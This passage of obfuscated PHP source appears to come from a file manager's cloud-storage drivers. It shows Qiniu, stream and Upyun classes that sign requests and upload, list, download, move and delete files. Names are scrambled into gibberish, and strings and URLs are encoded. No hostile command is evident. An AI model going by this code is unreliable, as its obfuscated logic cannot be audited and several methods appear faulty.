$this->tempFile($this->pathThis($šÒ°È )); file_put_contents($®ßıúÄË, $Ö‰¡²§º); if ($this->upload($šÒ°È , $®ßıúÄË)) { $this->tempFileRemve($®ßıúÄË); return !0; } return !1; } public function refreshUrls($Œğ¯§ã´) { $ÀÄÂ¼Œ• =& $_SERVER[ÕŸ²ó÷å]; $Ğ¬ˆÔ¼Ù = array(); if (is_array($Œğ¯§ã´)) { foreach ($Œğ¯§ã´ as $’÷¶ÄÃ³) { $Ğ¬ˆÔ¼Ù[] = $this->link($’÷¶ÄÃ³); } } else { $Ğ¬ˆÔ¼Ù[] = $this->link($Œğ¯§ã´); } $‰è¡æò = new Qiniu\Cdn\CdnManager($this->auth); list($åÒî¸Ôô, $’ƒ ß„²) = $‰è¡æò->refreshUrls($Ğ¬ˆÔ¼Ù); if ($’ƒ ß„²) { return !1; } return $åÒî¸Ôô[$ÀÄÂ¼Œ•[1267]] == $ÀÄÂ¼Œ•[843] ? !0 : !1; } public function fileSubstr($é¾µê¥è, $ì™ÆÊ˜£, $ªæù‰©ê) { $¦¾°µÙì =& $_SERVER[ÕŸ²ó÷å]; if (!($éİôşÌ€ = $this->link($é¾µê¥è))) { return !1; } $òõ£ÚøÄ = !1; if ($ªæù‰©ê > 0) { $ç«Õ›ã‚ = $ì™ÆÊ˜£ + $ªæù‰©ê - 1; $òõ£ÚøÄ = array($¦¾°µÙì[1536] . $ì™ÆÊ˜£ . $¦¾°µÙì[471] . $ç«Õ›ã‚); } $’ö¸ Ç = url_request($éİôşÌ€, $¦¾°µÙì[271], !1, $òõ£ÚøÄ); return $’ö¸ Ç[$¦¾°µÙì[834]] ? $’ö¸ Ç[$¦¾°µÙì[1290]] : !1; } public function upload($Ôó¶°È×, $¼—ùèŒ, $ÀûŸ¾š” = false, $¹Ó©†£ = REPEAT_REPLACE) { $àŠÕ³ôã = new Qiniu\Storage\UploadManager(); $—£İÔ÷õ = $this->auth->uploadToken($this->bucket, $Ôó¶°È×); $ï¯À¡íÎ = get_file_mime(get_path_ext($¼—ùèŒ)); list($ßµ¨«ê, $‡œôªèô) = $àŠÕ³ôã->putFile($—£İÔ÷õ, $Ôó¶°È×, $¼—ùèŒ, null, $ï¯À¡íÎ); return $‡œôªèô ? !1 : $this->getPathOuter($Ôó¶°È×); } public function uploadFormData($Â±ìŒÔ, $”İâüú = 3600) { return $this->uploadToken($Â±ìŒÔ, $”İâüú); } public function multiUploadFormData($Ö§Šû“ì, $æ«®†‘È = 3600) { return $this->uploadToken($Ö§Šû“ì, $æ«®†‘È); } private function uploadToken($œûêÕöì, $õµÁéÀŒ = 3600) { $©°é¡Æì =& $_SERVER[ÕŸ²ó÷å]; $Óó¥¯ìä = $õµÁéÀŒ; $µª¼ŸÔê = array($©°é¡Æì[1537] => $©°é¡Æì[1538]); $÷ŒÚÖ…Ú = $œûêÕöì; $îí‹§µ– = $this->auth->uploadToken($this->bucket, $÷ŒÚÖ…Ú, $Óó¥¯ìä, $µª¼ŸÔê, !0); $¯à¹çß = empty($this->region) || $this->region == $©°é¡Æì[1539] ? $©°é¡Æì[12] : $©°é¡Æì[471] . $this->region; $÷ôÊ­Ñ = http_type() . "\72\x2f\x2f\x75\160\x6c\x6f\141\144{$¯à¹çß}\x2e\161\151\156\x69\165\160\x2e\143\x6f\155\x2f"; return array($©°é¡Æì[1540] => $îí‹§µ–, $©°é¡Æì[1541] => $÷ôÊ­Ñ); } public function download($ä‚Ğ£¡, $÷ø¶Å™) { $¾â˜ Ñ = IO::getPathInner(IO::mkfile($÷ø¶Å™)); if (!($É‰Ô²î¿ = $this->link($ä‚Ğ£¡))) { return !1; } $¡š“ıï¡ = 0; $ëÕ…ø”È = 1024 * 200; $ë‹ÚÍ›Á = fopen($¾â˜ Ñ, $_SERVER[ÕŸ²ó÷å][1542]); while (!0) { $¨ ªà = $this->fileSubstr($ä‚Ğ£¡, $¡š“ıï¡, $ëÕ…ø”È); if ($¨ ªà === !1) { return !1; } fwrite($ë‹ÚÍ›Á, $¨ ªà); $¡š“ıï¡ += $ëÕ…ø”È; if (strlen($¨ ªà) < $ëÕ…ø”È) { break; } } fclose($ë‹ÚÍ›Á); return $÷ø¶Å™; } public function link($ƒ˜ÄÂ«Í, $ú¾™Âôú = '') { if (!$this->isFile($ƒ˜ÄÂ«Í)) { return !1; } $İ¥ÓÉ©€ = $this->getHost() . $_SERVER[ÕŸ²ó÷å][8] . $this->pathEncode($ƒ˜ÄÂ«Í) . $ú¾™Âôú; return $this->auth->privateDownloadUrl($İ¥ÓÉ©€, 3600 * 12); } public function fileOut($ÊŒúŠÖ, $€İˆ÷ãÉ = false, $¹ÇŸü§ = false, $Íôû‰û­ = '') { $òÇŒ•èÓ =& $_SERVER[ÕŸ²ó÷å]; if ($this->isFileOutServer()) { return $this->fileOutServer($ÊŒúŠÖ, $€İˆ÷ãÉ, $¹ÇŸü§, $Íôû‰û­); } if (!$¹ÇŸü§) { $¹ÇŸü§ = $this->pathThis($ÊŒúŠÖ); } $³„î­ô˜ = $€İˆ÷ãÉ ? $òÇŒ•èÓ[1543] . rawurlencode($¹ÇŸü§) : $òÇŒ•èÓ[12]; $­©…Õ Ò = $this->link($ÊŒúŠÖ, $³„î­ô˜); $this->fileOutLink($­©…Õ Ò); } public function fileOutServer($ÚÜê…áŞ, $íçÈÉ†í = false, $’Ç±õëÆ = false, $ù„¡”› = '') { parent::fileOut($ÚÜê…áŞ, $íçÈÉ†í, $’Ç±õëÆ, $ù„¡”›); } public function fileOutImage($²È†ÕÄó, $½ÔíÌÀ¡ = 250) { if ($this->size($²È†ÕÄó) > 1024 * 1024 * 20) { return $this->fileOutImageServer($²È†ÕÄó, $½ÔíÌÀ¡); } $áÒä¨–Ê = $this->link($²È†ÕÄó, $_SERVER[ÕŸ²ó÷å][1544] . $½ÔíÌÀ¡); $this->fileOutLink($áÒä¨–Ê); } public function fileOutImageServer($»œ‚¥Íï, $ûÇˆ£Çğ = 250) { parent::fileOutImage($»œ‚¥Íï, $ûÇˆ£Çğ); } public function hashMd5($‘˜ºãÑÀ) { $ºÇ™Ë‘Ê =& $_SERVER[ÕŸ²ó÷å]; $“Æ˜•¤ç = $this->objectMeta($‘˜ºãÑÀ); return isset($“Æ˜•¤ç[$ºÇ™Ë‘Ê[255]]) ? $“Æ˜•¤ç[$ºÇ™Ë‘Ê[255]] : !1; $Ì¦óş´Ş = $this->link($‘˜ºãÑÀ, $ºÇ™Ë‘Ê[1545]); } public function size($¤ÀÍ¸) { $¥‰ñ†÷´ = $this->objectMeta($¤ÀÍ¸); return $¥‰ñ†÷´ ? $¥‰ñ†÷´[$_SERVER[ÕŸ²ó÷å][89]] : 0; } public function info($á¶ÍªÁä) { if ($this->isFolder($á¶ÍªÁä)) { return $this->folderInfo($á¶ÍªÁä); } else { if ($this->isFile($á¶ÍªÁä)) { return $this->fileInfo($á¶ÍªÁä); } } return !1; } public function exist($ËÓ‰ñÑ) { return $this->isFile($ËÓ‰ñÑ) || $this->isFolder($ËÓ‰ñÑ); } public function isFile($ï­é·‡­) { return !$this->isFolder($ï­é·‡­) && $this->objectMeta($ï­é·‡­); } public function isFolder($Ï·”±Ş÷) { return $this->cacheMethod($_SERVER[ÕŸ²ó÷å][189], $Ï·”±Ş÷); } protected function objectMeta($Şí¾İÈ) { return $this->cacheMethod($_SERVER[ÕŸ²ó÷å][191], $Şí¾İÈ); } protected function _objectMeta($ë¿íğø) { $˜˜£†¦œ =& $_SERVER[ÕŸ²ó÷å]; list($ø‚ããµ’, $‹„á†ëÍ) = $this->bucketManager->stat($this->bucket, $ë¿íğø); if ($ø‚ããµ’) { $ø‚ããµ’[$˜˜£†¦œ[89]] = intval($ø‚ããµ’[$˜˜£†¦œ[1531]]); } return $ø‚ããµ’; } protected function _isFolder($üÔÀÙÇ) { $•Õ¦¨Ùõ =& $_SERVER[ÕŸ²ó÷å]; if ($üÔÀÙÇ == $•Õ¦¨Ùõ[12] || $üÔÀÙÇ == $•Õ¦¨Ùõ[8]) { return !0; } list($¾•½Ö‰£, $ªºîä«) = $this->bucketManager->listFiles($this->bucket, trim($üÔÀÙÇ, $•Õ¦¨Ùõ[8]) . $•Õ¦¨Ùõ[8], $•Õ¦¨Ùõ[12], 1, $•Õ¦¨Ùõ[8]); return !empty($¾•½Ö‰£[$•Õ¦¨Ùõ[1534]]) || !empty($¾•½Ö‰£[$•Õ¦¨Ùõ[1535]]) ? !0 : !1; } } class PathDriverStream extends PathDriverBase { const TYPE_STRING = 1; const TYPE_FILE = 2; public function __construct($öÙÖòÍŸ, $ù¤ÈßÎ™ = 0) { parent::__construct(); $this->source = $öÙÖòÍŸ; $this->sourceSize = $ù¤ÈßÎ™; if (is_string($this->source)) { $this->sourceType = self::TYPE_STRING; $this->sourceSize = strlen($this->source); } else { $this->sourceType = self::TYPE_FILE; } } public function size($ó¥ÎÜÆ… = false) { return $this->sourceSize; } public function getContent($ŠŸ±Ó·ò = false) { return $this->fileSubstr($ŠŸ±Ó·ò, 0, $this->sourceSize); } public function fileSubstr($¿¢ê“¿Ò = false, $ÙûôÑ­ = 0, $éĞºª«ã = 0) { if (!$éĞºª«ã) { $éĞºª«ã = $this->sourceSize; } $ÜâéĞ¼ = $this->sourceSize - $ÙûôÑ­; if ($éĞºª«ã >= $ÜâéĞ¼) { $éĞºª«ã = $ÜâéĞ¼; } if ($this->sourceType == self::TYPE_STRING) { return substr($this->source, $ÙûôÑ­, $éĞºª«ã); } if ($this->sourceType == self::TYPE_FILE) { if ($éĞºª«ã <= 0) { return $_SERVER[ÕŸ²ó÷å][12]; } $ı§´…ÁÚ = ftell($this->source); fseek_64($this->source, $ı§´…ÁÚ + $ÙûôÑ­); $¸ü¾ ¨ = @fread($this->source, $éĞºª«ã); fseek_64($this->source, $ı§´…ÁÚ); return $¸ü¾ ¨; } } public function hashMd5($¦ŸİŒ = false) { return md5($this->getContent()); } public static function hash($é¿¼Òú, $Ï¤ÕÉ = 0) { $¼•šÏØğ = new PathDriverStream($é¿¼Òú, $Ï¤ÕÉ); return $¼•šÏØğ->hashSimple($é¿¼Òú); } public static function md5($İùì Ú, $–‚ ¾˜Ì = 0) { $şğ¦‰·¤ = new PathDriverStream($İùì Ú, $–‚ ¾˜Ì); return $şğ¦‰·¤->hashMd5($İùì Ú); } } class PathDriverUSS extends PathDriverBase { protected $bucket = ''; protected $username = ''; protected $userpass = ''; protected $domain = ''; protected $token = ''; protected $endpoint = "\x68\164\164\x70\x3a\57\57\x76\x30\x2e\x61\x70\151\x2e\165\160\171\x75\x6e\x2e\x63\157\155"; public $ioUploadServer = 0; public $ioFileOutServer = 0; public function __construct($·ÕÔ†Ù) { parent::__construct(); $this->_init($·ÕÔ†Ù); } public function _init($Ÿ«Ôìú) { $²ËêÕ‰– =& $_SERVER[ÕŸ²ó÷å]; foreach ($Ÿ«Ôìú as $ÔšÀíß => $“şŸÑîÍ) { if (isset($this->{$ÔšÀíß})) { $this->{$ÔšÀíß} = $“şŸÑîÍ; } } if (empty($this->username) || empty($this->userpass) || empty($this->domain)) { throw new Exception($²ËêÕ‰–[1546] . LNG($²ËêÕ‰–[1465])); } } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } private function ussHeaders($¬Ê¿ ãì, $´öïÆÜü = "\x47\x45\124") { $ˆÉ¡·‰Š =& $_SERVER[ÕŸ²ó÷å]; $Ú¸ÙŒ¢ı = gmdate($ˆÉ¡·‰Š[1494]); $¬åÅ¬íÕ = base64_encode(hash_hmac($ˆÉ¡·‰Š[1547], "{$´öïÆÜü}\x26{$¬Ê¿ ãì}\x26{$Ú¸ÙŒ¢ı}", md5("{$this->userpass}"), !0)); $üÄ…©¬ = array("\x41\165\x74\150\x6f\162\x69\172\141\x74\x69\157\x6e\72\x55\x50\x59\x55\x4e\40{$this->username}\x3a{$¬åÅ¬íÕ}", "\104\141\x74\145\72{$Ú¸ÙŒ¢ı}"); return $üÄ…©¬; } public function ussRequest($˜´ÈÂú, $çèëú¼¶ = "\107\x45\124", $öÄ„Äêı = false, $…ÏÇæÑ” = false, $îŞşÛÉ = false) { $¥¼çÂ´¨ =& $_SERVER[ÕŸ²ó÷å]; $˜´ÈÂú = trim($˜´ÈÂú, $¥¼çÂ´¨[8]); $êïŠ¦äæ = "\57{$this->bucket}\x2f{$˜´ÈÂú}"; $Šóó˜´ = $this->ussHeaders($êïŠ¦äæ, $çèëú¼¶); if ($…ÏÇæÑ”) { $Šóó˜´ = array_merge($Šóó˜´, $…ÏÇæÑ”); } $¾éÒŠù¿ = url_request($this->endpoint . $êïŠ¦äæ, $çèëú¼¶, $öÄ„Äêı, $Šóó˜´, $îŞşÛÉ); if (!$¾éÒŠù¿) { $‹ÁÆÚÅË = LNG($¥¼çÂ´¨[1548]); $this->writeLog($‹ÁÆÚÅË); return array($¥¼çÂ´¨[1300] => !1, $¥¼çÂ´¨[1290] => $‹ÁÆÚÅË); } if (strtolower($çèëú¼¶) == $¥¼çÂ´¨[237] || in_array($¾éÒŠù¿[$¥¼çÂ´¨[1300]], array($¥¼çÂ´¨[283], $¥¼çÂ´¨[1549]))) { $öÄ„Äêı = $¾éÒŠù¿[$¥¼çÂ´¨[1550]]; } else { $öÄ„Äêı = json_decode($¾éÒŠù¿[$¥¼çÂ´¨[1290]], !0); if (!$öÄ„Äêı) { $öÄ„Äêı = $¾éÒŠù¿[$¥¼çÂ´¨[1290]]; } else { if (!$¾éÒŠù¿[$¥¼çÂ´¨[834]] && isset($öÄ„Äêı[$¥¼çÂ´¨[1551]])) { $öÄ„Äêı = $öÄ„Äêı[$¥¼çÂ´¨[1551]]; } } } if (!$¾éÒŠù¿[$¥¼çÂ´¨[834]]) { $this->writeLog($this->__errorMessage($öÄ„Äêı)); } return array($¥¼çÂ´¨[1300] => $¾éÒŠù¿[$¥¼çÂ´¨[834]], $¥¼çÂ´¨[1290] => $öÄ„Äêı); } private function __errorMessage($‡µ‡ŠØ) { $Ÿ®õ€€ó =& $_SERVER[ÕŸ²ó÷å]; if (!$‡µ‡ŠØ) { return $Ÿ®õ€€ó[12]; } static $Ä˜§Øİ = null; if (!$Ä˜§Øİ) { $Ä˜§Øİ = I18n::getType(); } if ($Ä˜§Øİ != $Ÿ®õ€€ó[1504]) { return $‡µ‡ŠØ; } $Ê”Ï²É€ = array($Ÿ®õ€€ó[1552] => $Ÿ®õ€€ó[1553], $Ÿ®õ€€ó[1554] => $Ÿ®õ€€ó[1555], $Ÿ®õ€€ó[1556] => $Ÿ®õ€€ó[1555], $Ÿ®õ€€ó[1557] => $Ÿ®õ€€ó[1558], $Ÿ®õ€€ó[1559] => $Ÿ®õ€€ó[1560], $Ÿ®õ€€ó[1561] => $Ÿ®õ€€ó[1562], $Ÿ®õ€€ó[1563] => $Ÿ®õ€€ó[1564]); return isset($Ê”Ï²É€[$‡µ‡ŠØ]) ? $Ê”Ï²É€[$‡µ‡ŠØ] : $‡µ‡ŠØ; } public function mkfile($œ¥ïÀ†Ó, $¦íâ¥Ã = '', $øñ¯İ™‹ = REPEAT_RENAME) { if ($this->setContent($œ¥ïÀ†Ó, $¦íâ¥Ã)) { return $this->getPathOuter($œ¥ïÀ†Ó); } return !1; } public function mkdir($ßï›Ÿşƒ, $¹Ú´âãÌ = REPEAT_SKIP) { $«ÈÅİÅà =& $_SERVER[ÕŸ²ó÷å]; $“”Ÿ×ºé = trim($ßï›Ÿşƒ, $«ÈÅİÅà[8]); if ($this->_isFolder($“”Ÿ×ºé)) { return $this->getPathOuter($“”Ÿ×ºé); } $¥Å¯æ¡€ = array($«ÈÅİÅà[1565]); $èİÎß¯Ï = $this->ussRequest($“”Ÿ×ºé, $«ÈÅİÅà[267], !1, $¥Å¯æ¡€); return $èİÎß¯Ï[$«ÈÅİÅà[1300]] ? $this->getPathOuter($“”Ÿ×ºé) : !1; } public function copyFile($äÜÖ²Ûá, $ö¦¦ì®Š) { $Ó†¤÷°ô =& $_SERVER[ÕŸ²ó÷å]; $ùìò÷‹¥ = array($Ó†¤÷°ô[1566] . "\57{$this->bucket}\x2f{$äÜÖ²Ûá}", $Ó†¤÷°ô[1567]); $¿²ö†…È = $this->ussRequest($ö¦¦ì®Š, $Ó†¤÷°ô[269], !1, $ùìò÷‹¥); return $¿²ö†…È[$Ó†¤÷°ô[1300]] ? !0 : $this->getPathOuter($ö¦¦ì®Š); } public function moveFile($™½Š–ú­, $ŠÇ­¤¯¿) { $äí‘áÊÈ =& $_SERVER[ÕŸ²ó÷å]; $ëÍ—¬çå = array($äí‘áÊÈ[1568] . "\x2f{$this->bucket}\57{$™½Š–ú­}", $äí‘áÊÈ[1567]); $·ÄêÎ‹ø = $this->ussRequest($ŠÇ­¤¯¿, $äí‘áÊÈ[269], !1, $ëÍ—¬çå); return $·ÄêÎ‹ø[$äí‘áÊÈ[1300]] ? !0 : $this->getPathOuter($ŠÇ­¤¯¿); } public function delFile($½Ëö“œ¡) { $—Ø±ê­Ù =& $_SERVER[ÕŸ²ó÷å]; $Ã¨¥Õ×ô = $this->ussRequest($½Ëö“œ¡, $—Ø±ê­Ù[1569]); return $Ã¨¥Õ×ô[$—Ø±ê­Ù[1300]] ? !0 : !1; } public function delFolder($³ˆ¯ú ) { $¯›¿³âÔ =& $_SERVER[ÕŸ²ó÷å]; if (!$this->exist($³ˆ¯ú )) { return !0; } $this->listItemCache = !1; $ÔØÛå®Ÿ = $Á˜ìó›– = array(); $this->fileList($³ˆ¯ú , $ÔØÛå®Ÿ, $Á˜ìó›–, !0); $this->listItemCache = !0; foreach ($Á˜ìó›– as $Á€Êí¹) { $¬¼ë•® = $this->ussRequest($Á€Êí¹[$¯›¿³âÔ[32]], $¯›¿³âÔ[1569]); if (!$¬¼ë•®[$¯›¿³âÔ[1300]]) { return !1; } } foreach ($ÔØÛå®Ÿ as $ôİß•µ) { $¬¼ë•® = $this->ussRequest($ôİß•µ, $¯›¿³âÔ[1569]); if (!$¬¼ë•®[$¯›¿³âÔ[1300]]) { return !1; } } $¬¼ë•® = $this->ussRequest($³ˆ¯ú , $¯›¿³âÔ[1569]); return $¬¼ë•®[$¯›¿³âÔ[1300]]; } public function rename($ÊŞŠÃÒÅ, $ÑÌù•ë) { if ($this->isFile($ÊŞŠÃÒÅ)) { $ÑÌù•ë = get_path_father($ÊŞŠÃÒÅ) . $ÑÌù•ë; return $this->moveFile($ÊŞŠÃÒÅ, $ÑÌù•ë); } return $this->renameObject($ÊŞŠÃÒÅ, $ÑÌù•ë); } public function fileInfo($¿ºÓºøÏ, $©÷ÚÚØğ = false, $’˜èÔÉ– = array()) { $ºˆÕİÃÛ =& $_SERVER[ÕŸ²ó÷å]; $ôªòÊà¥ = array($ºˆÕİÃÛ[32] => $this->pathThis($¿ºÓºøÏ), $ºˆÕİÃÛ[97] => $this->getPathOuter($ºˆÕİÃÛ[8] . $¿ºÓºøÏ), $ºˆÕİÃÛ[33] => $ºˆÕİÃÛ[240], $ºˆÕİÃÛ[89] => isset($’˜èÔÉ–[$ºˆÕİÃÛ[89]]) ? $’˜èÔÉ–[$ºˆÕİÃÛ[89]] : 0, $ºˆÕİÃÛ[179] => $this->ext($¿ºÓºøÏ)); if ($©÷ÚÚØğ) { return $ôªòÊà¥; } $ôªòÊà¥[$ºˆÕİÃÛ[241]] = $ôªòÊà¥[$ºˆÕİÃÛ[98]] = 0; $ôªòÊà¥[$ºˆÕİÃÛ[242]] = $ôªòÊà¥[$ºˆÕİÃÛ[243]] = !0; if (empty($’˜èÔÉ–)) { $’˜èÔÉ– = $this->objectMeta($¿ºÓºøÏ); if (!$’˜èÔÉ–) { return $ôªòÊà¥; } } $ôªòÊà¥[$ºˆÕİÃÛ[241]] = intval($’˜èÔÉ–[$ºˆÕİÃÛ[1570]]); $ôªòÊà¥[$ºˆÕİÃÛ[98]] = intval($’˜èÔÉ–[$ºˆÕİÃÛ[1571]]); $ôªòÊà¥[$ºˆÕİÃÛ[89]] = $’˜èÔÉ–[$ºˆÕİÃÛ[89]]; return $ôªòÊà¥; } public function folderInfo($àÁ“ÂåÅ, $¤öã³®Ú = false) { $Œ•Ä¾·È =& $_SERVER[ÕŸ²ó÷å]; $÷Ó•°Å = array($Œ•Ä¾·È[32] => $this->pathThis($àÁ“ÂåÅ), $Œ•Ä¾·È[97] => $this->getPathOuter($Œ•Ä¾·È[8] . $àÁ“ÂåÅ), $Œ•Ä¾·È[33] => $Œ•Ä¾·È[88]); if ($¤öã³®Ú) { return $÷Ó•°Å; } $÷Ó•°Å[$Œ•Ä¾·È[241]] = $÷Ó•°Å[$Œ•Ä¾·È[98]] = 0; $÷Ó•°Å[$Œ•Ä¾·È[242]] = $÷Ó•°Å[$Œ•Ä¾·È[243]] = !0; if (empty($Ê˜¶ ·Õ)) { $Ê˜¶ ·Õ = $this->objectMeta($àÁ“ÂåÅ); if (!$Ê˜¶ ·Õ) { return $÷Ó•°Å; } } $÷Ó•°Å[$Œ•Ä¾·È[241]] = intval($Ê˜¶ ·Õ[$Œ•Ä¾·È[1570]]); $÷Ó•°Å[$Œ•Ä¾·È[98]] = intval($Ê˜¶ ·Õ[$Œ•Ä¾·È[1571]]); return $÷Ó•°Å; } private function listObjs($áÛ­Â–¸, $ö¹¡ò = 0, $ºÃ³ÑÂ¨ = 1000) { $·ÕİÈÂü =& $_SERVER[ÕŸ²ó÷å]; $œ¹»ôå  = array($·ÕİÈÂü[1572], $·ÕİÈÂü[1573] . $ºÃ³ÑÂ¨); if ($ö¹¡ò) { $œ¹»ôå [] = $·ÕİÈÂü[1574] . $ö¹¡ò; } $±¡å†â¨ = $this->ussRequest($áÛ­Â–¸, $·ÕİÈÂü[271], !1, $œ¹»ôå ); return !$±¡å†â¨[$·ÕİÈÂü[1300]] ? !1 : $±¡å†â¨[$·ÕİÈÂü[1290]]; } private function fileList($ğ¸àæ—…, &$¤¯ÔÓÊÌ, &$º­¦Ü‚Í, $Ş·Ì—” = false) { $ã±ŒÍ  =& $_SERVER[ÕŸ²ó÷å]; $çß†ìÙ„ = $ã±ŒÍ [12]; $Ğ“Ş†°° = 1000; $—á‹Ï˜é = rtrim($ğ¸àæ—…, $ã±ŒÍ [8]) . $ã±ŒÍ [8]; while (!0) { check_abort(); $Ò—§€åÙ = $this->listObjs($ğ¸àæ—…, $çß†ìÙ„, $Ğ“Ş†°°); if (!$Ò—§€åÙ) { return !1; } $çß†ìÙ„ = isset($Ò—§€åÙ[$ã±ŒÍ [1575]]) ? $Ò—§€åÙ[$ã±ŒÍ [1575]] : $ã±ŒÍ [12]; $¹ªîç = isset($Ò—§€åÙ[$ã±ŒÍ [1576]]) ? $Ò—§€åÙ[$ã±ŒÍ [1576]] : array(); foreach ($¹ªîç as $õ–¾²ÃÉ) { $ÃÈíŸ€– = $õ–¾²ÃÉ[$ã±ŒÍ [33]] == $ã±ŒÍ [88] ? !0 : !1; $ª¥‘„¶é = ltrim($—á‹Ï˜é . $õ–¾²ÃÉ[$ã±ŒÍ [32]], $ã±ŒÍ [8]) . ($ÃÈíŸ€– ? $ã±ŒÍ [8] : $ã±ŒÍ [12]); $×ÒÌŸ€° = array($ã±ŒÍ [32] => $ª¥‘„¶é, $ã±ŒÍ [33] => $ÃÈíŸ€– ? $ã±ŒÍ [88] : $ã±ŒÍ [240], $ã±ŒÍ [89] => $õ–¾²ÃÉ[$ã±ŒÍ [422]], $ã±ŒÍ [1571] => $õ–¾²ÃÉ[$ã±ŒÍ [1577]]); $this->cacheMethodInfoSet($ª¥‘„¶é, $ÃÈíŸ€–, $×ÒÌŸ€°); if ($ÃÈíŸ€–) { $¤¯ÔÓÊÌ[] = $ª¥‘„¶é; if ($Ş·Ì—”) { $this->fileList($ª¥‘„¶é, $¤¯ÔÓÊÌ, $º­¦Ü‚Í, $Ş·Ì—”); } continue; } $º­¦Ü‚Í[] = $×ÒÌŸ€°; } if (count($¹ªîç) < $Ğ“Ş†°°) { break; } } $this->cacheMethodInfoSet($ğ¸àæ—…, !0); } public function listPath($òâÔ”Ú, $©œ©Ûî¹ = false) { $ÚöøËö€ =& $_SERVER[ÕŸ²ó÷å]; $ó…¸²Ò¾ = $îï³‰ºÍ = array(); $this->fileList($òâÔ”Ú, $ó…¸²Ò¾, $îï³‰ºÍ); foreach ($ó…¸²Ò¾ as $ÚŞ€ôÊ => $ô‘Üá¨) { $ó…¸²Ò¾[$ÚŞ€ôÊ] = $this->folderInfo($ô‘Üá¨, $©œ©Ûî¹); } foreach ($îï³‰ºÍ as $ÚŞ€ôÊ => $ô‘Üá¨) { $îï³‰ºÍ[$ÚŞ€ôÊ] = $this->fileInfo($ô‘Üá¨[$ÚöøËö€[32]], $©œ©Ûî¹, $ô‘Üá¨); } return array($ÚöøËö€[95] => $ó…¸²Ò¾, $ÚöøËö€[96] => $îï³‰ºÍ); } public function has($›ÛÈÕ™Æ, $«ğ¥¢æÈ = false, $¿²ŸÖùŞ = true) { $ØöàÙÔ½ =& $_SERVER[ÕŸ²ó÷å]; $ùıŒ¼Â¨ = $ØöàÙÔ½[12]; $°ç‡ßê¤ = 500; $Ğ±ÄêÙâ = 0; $é‰ìÈ–· = 0; $®ªà´˜˜ = rtrim($›ÛÈÕ™Æ, $ØöàÙÔ½[8]) . $ØöàÙÔ½[8]; while (!0) { check_abort(); $»é±²©Š = $this->listObjs($›ÛÈÕ™Æ, $ùıŒ¼Â¨, $°ç‡ßê¤); if (!$»é±²©Š) { return !1; } $ùıŒ¼Â¨ = isset($»é±²©Š[$ØöàÙÔ½[1575]]) ? $»é±²©Š[$ØöàÙÔ½[1575]] : $ØöàÙÔ½[12]; $›òîÏÅ² = isset($»é±²©Š[$ØöàÙÔ½[1576]]) ? $»é±²©Š[$ØöàÙÔ½[1576]] : array(); if (empty($›òîÏÅ²)) { break; } $šëŸô÷§ = array_filter($›òîÏÅ², function ($¦ÔŸ™„–) { $äÙ™ü‰Ú =& $_SERVER[ÕŸ²ó÷å]; return $¦ÔŸ™„–[$äÙ™ü‰Ú[33]] == $äÙ™ü‰Ú[88]; }); $¸°ä›º¡ = count($›òîÏÅ²); $šëŸô÷§ = count($šëŸô÷§); $à¬¦°·‹ = $¸°ä›º¡ - $šëŸô÷§; if ($«ğ¥¢æÈ) { $é‰ìÈ–· += $šëŸô÷§; $Ğ±ÄêÙâ += $à¬¦°·‹; if ($¸°ä›º¡ < $°ç‡ßê¤) { break; } continue; } if ($¿²ŸÖùŞ) { if ($à¬¦°·‹) { return !0; } } else { if ($šëŸô÷§) { return !0; } } if ($¸°ä›º¡ < $°ç‡ßê¤) { break; } } if ($«ğ¥¢æÈ) { return array($ØöàÙÔ½[249] => $Ğ±ÄêÙâ, $ØöàÙÔ½[250] => $é‰ìÈ–·); } return !1; } public function listAll($ğ¡‘½Ô) { $ÑãÒÍ·ß =& $_SERVER[ÕŸ²ó÷å]; $‘éËİìÀ = $Æ“‚™è¢ = array(); $this->fileList($ğ¡‘½Ô, $‘éËİìÀ, $Æ“‚™è¢, !0); $Ÿ–ã·ñ» = array_to_keyvalue($Æ“‚™è¢, $ÑãÒÍ·ß[32]); foreach ($‘éËİìÀ as $ÁîÀ¹Ä) { if (is_string($ÁîÀ¹Ä)) { $Ÿ–ã·ñ»[$ÁîÀ¹Ä] = array($ÑãÒÍ·ß[89] => 0); } } return $this->listAllFiles($ğ¡‘½Ô, $Ÿ–ã·ñ»); } public function canRead($™©ŒÑµí) { return $this->exist($™©ŒÑµí) ? !0 : !1; } public function canWrite($óŠµËÉ—) { return $this->exist($óŠµËÉ—) ? !0 : !1; } public function getContent($ìèúÜÚ) { return $this->fileSubstr($ìèúÜÚ, 0, -1); } public function setContent($ë¿œÖëª, $›ñ–±­â = '') { $â¾ó÷ó =& $_SERVER[ÕŸ²ó÷å]; if (!$›ñ–±­â) { $¦”¦±İ£ = $this->ussRequest($ë¿œÖëª, $â¾ó÷ó[267]); return $¦”¦±İ£[$â¾ó÷ó[1300]]; } $Š›ºÄÑù = $this->tempFile($this->pathThis($ë¿œÖëª)); file_put_contents($Š›ºÄÑù, $›ñ–±­â); if ($this->upload($ë¿œÖëª, $Š›ºÄÑù)) { $this->tempFileRemve($Š›ºÄÑù); return !0; } return !1; } public function fileSubstr($Ô‘ˆşıİ, $Õœ”ØÕÎ, $å¬¯¤ãÑ) { $»”’Âï =& $_SERVER[ÕŸ²ó÷å]; if (!($´ŠÃï ‚ = $this->link($Ô‘ˆşıİ))) { return !1; } $ó¤¶¢öğ = !1; if ($å¬¯¤ãÑ > 0) { $È¶‚‹«ê = $Õœ”ØÕÎ + $å¬¯¤ãÑ - 1; $ó¤¶¢öğ = array($»”’Âï[1536] . $Õœ”ØÕÎ . $»”’Âï[471] . $È¶‚‹«ê); } $Ç…Ï†Çı = url_request($´ŠÃï ‚, $»”’Âï[271], !1, $ó¤¶¢öğ); return $Ç…Ï†Çı[$»”’Âï[834]] ? $Ç…Ï†Çı[$»”’Âï[1290]] : !1; } public function upload($éóÒäÈÏ, $©Å‚–¼, $½ˆØŒÓÎ = false, $ÏóÁŞ¿ = REPEAT_REPLACE) { $º¸İúã– =& $_SERVER[ÕŸ²ó÷å]; $ˆä¾ü° = IO::size($©Å‚–¼); if ($ˆä¾ü° <= 1024 * 1024 * 200) { $×”ƒ£ßì = array($º¸İúã–[1578] . $©Å‚–¼); $”ı‹±¬Ú = $this->ussRequest($éóÒäÈÏ, $º¸İúã–[269], $×”ƒ£ßì); return $”ı‹±¬Ú[$º¸İúã–[1300]] ? $this->getPathOuter($éóÒäÈÏ) : !1; } $ô¬åó¥å = 1024 * 1024 * 10; $½„üé€‡ = array($º¸İúã–[1579], $º¸İúã–[1580] . $ˆä¾ü°, $º¸İúã–[1581], 